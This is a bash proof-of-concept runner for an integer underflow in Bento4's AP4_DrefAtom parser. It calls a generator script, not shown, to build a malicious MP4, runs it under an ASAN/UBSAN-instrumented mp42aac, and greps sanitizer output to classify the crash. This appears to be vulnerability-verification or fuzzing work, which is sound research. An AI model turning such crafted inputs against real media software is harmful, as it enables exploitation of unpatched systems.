#!/usr/bin/env bash
# PoC run script for VULN 001: Integer Underflow in AP4_DrefAtom::AP4_DrefAtom()
# Builds the malicious MP4 then exercises it under ASAN+UBSAN mp42aac.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
POC_MP4="${SCRIPT_DIR}/vuln_001.mp4"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"
RESULT_FILE="${SCRIPT_DIR}/vuln_001_result.txt"
STATUS_FILE="${SCRIPT_DIR}/vuln_001_status.txt"

echo "[*] Step 1: Generate malicious MP4"
python3 "${SCRIPT_DIR}/vuln_001_gen.py"

echo "[*] Step 2: Verify MP4 was created"
if [[ ! -f "${POC_MP4}" ]]; then
    echo "ERROR: MP4 file not generated" >&2
    echo "ERROR" > "${STATUS_FILE}"
    exit 1
fi
ls -lh "${POC_MP4}"

echo "[*] Step 3: Run mp42aac under ASAN+UBSAN"
# ASAN options: print all issues, don't abort early, verbose stack traces
export ASAN_OPTIONS="halt_on_error=0:print_stats=0:detect_leaks=0:allocator_may_return_null=1"
export UBSAN_OPTIONS="halt_on_error=0:print_stacktrace=1:report_error_type=1"

# Capture stdout, stderr, and exit code separately
OUTFILE="/tmp/mp42aac_stdout_$$.txt"
ERRFILE="/tmp/mp42aac_stderr_$$.txt"

set +e
timeout 15 "${BINARY}" "${POC_MP4}" /dev/null \
    >"${OUTFILE}" 2>"${ERRFILE}"
EXIT_CODE=$?
set -e

echo "[*] Step 4: Collect results"
{
    echo "=== VULN 001: Integer Underflow in AP4_DrefAtom ==="
    echo "=== mp42aac exit code: ${EXIT_CODE} ==="
    echo ""
    echo "--- STDOUT ---"
    cat "${OUTFILE}" 2>/dev/null || true
    echo ""
    echo "--- STDERR (ASAN/UBSAN output) ---"
    cat "${ERRFILE}" 2>/dev/null || true
} > "${RESULT_FILE}"

echo "[*] Result saved to: ${RESULT_FILE}"
cat "${RESULT_FILE}"

echo "[*] Step 5: Determine status"
ASAN_HIT=$(grep -c "AddressSanitizer\|ASAN\|heap-buffer-overflow\|heap-use-after-free\|stack-buffer-overflow\|SEGV\|runtime error\|undefined.*behavior\|integer overflow\|load of value\|UBSan" \
           "${ERRFILE}" 2>/dev/null || true)

if [[ ${EXIT_CODE} -ne 0 ]] && [[ ${ASAN_HIT} -gt 0 ]]; then
    STATUS="VERIFIED_CRASH"
elif [[ ${ASAN_HIT} -gt 0 ]]; then
    STATUS="VERIFIED_CRASH"   # sanitizer reported even if exit=0
elif [[ ${EXIT_CODE} -eq 124 ]]; then
    STATUS="TIMEOUT"
elif [[ ${EXIT_CODE} -ne 0 ]]; then
    # Crashed (SIGABRT, SIGSEGV, etc.) but no sanitizer message captured
    STATUS="UNVERIFIED"
else
    STATUS="UNVERIFIED"
fi

echo "${STATUS}" > "${STATUS_FILE}"
echo "[*] Status: ${STATUS}"

# Cleanup temp files
rm -f "${OUTFILE}" "${ERRFILE}"
